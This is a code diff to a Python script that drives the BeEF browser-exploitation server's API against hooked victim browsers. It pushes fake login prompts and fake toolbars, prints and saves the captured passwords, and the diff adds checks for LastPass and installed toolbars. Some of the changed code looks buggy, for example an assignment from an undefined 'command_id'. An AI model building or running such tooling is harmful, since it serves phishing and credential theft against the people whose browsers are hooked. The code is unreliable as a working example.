@@ -9,7 +9,8 @@ class Browser_Parser:
 
 
 	def __init__(self):
-		self.user_id =  str(sys.argv[1:])
+		self.user_id =  sys.argv[1:]
+		self.user_id = self.user_id[0]
 		print str(self.user_id)
 		self.browser_db_router= Browser_DB_Router(self.user_id)
 		self.uname = "beef"
@@ -85,8 +86,8 @@ class Browser_Parser:
 		if f_f['success'] == "true":
 			print "successfully sent prompt..."
 			print "command id:" + str(f_f['command_id'])
-			self.toolbar_prompt_id = f_f['command_id']
-			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, self.toolbar_prompt_id)
+			self.toolbar_prompt_id = command_id
+			self.browser_db_router.update_BrowserTable_Toolbar_Cmd(self.user_id, str(f_f['command_id']))
 		else:
 			print "prompt request unsucessful"
 			return None
@@ -110,17 +111,21 @@ class Browser_Parser:
 			#send to password table with account as ususal
 			print password
 			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 1)
-		except Error:
+		except KeyError:
 			print("did not get response yet")
 			return self.browser_db_router.update_BrowserTable_Login(self.user_id, 0)
 
 
 	def get_toolbar_result(self):
+		#if toolbar prompt id is none, return
 		idee = self.browser_db_router.get_browser_toolbar_cmd(self.user_id)
-		command_id = self.browser_db_router.get_browser_session_id(self.user_id)
+		print str(idee)
+		self.browser_id = self.browser_db_router.get_browser_session_id(self.user_id)
+		print str(self.browser_id)
+		print(str("toolbar_prompt_id:" + str(self.toolbar_prompt_id)))
 		dets = requests.get(url='https://192.168.3.1:3000/api/modules/'
 			+ str(self.browser_id)
-			+ '/' + str(command_id) + '/' + str(idee)
+			+ '/' + str(self.toolbar_prompt_id) + '/' + str(idee)
 			+"?token="
 			+str(self.api_key), cert=self.cert, verify=False)
 		c_dict= json.loads(dets.text)
@@ -131,8 +136,6 @@ class Browser_Parser:
 		except KeyError as ke:
 			print "user has not clicked on toolbar"
 			return self.browser_db_router.update_BrowserTable_Toolbar(self.user_id, 0)
-
-
 
 
 	def get_hooked_browsers(self):
@@ -203,7 +206,9 @@ class Browser_Parser:
 							"3.Display fake toolbar\n"\
 							"4.Save fake login results\n"\
 							"5.Save fake toolbar results\n"\
-							"6.Exit\n")
+							"6.Check for LastPass\n"\
+							"7.Check for installed toolbars\n"\
+							"8.Exit\n")
 			try:
 				resp = int(resp)
 			except ValueError:
@@ -231,10 +236,9 @@ class Browser_Parser:
 		elif resp == 5:
 			self.get_toolbar_result()
 			self.menu()
-		elif resp == 6:
+		elif resp == 8:
 			os.system("sudo pkill airodump-ng && sudo pkill python") 
 			sys.exit(0)
 
 if __name__ == "__main__":
 	bp = Browser_Parser()
-
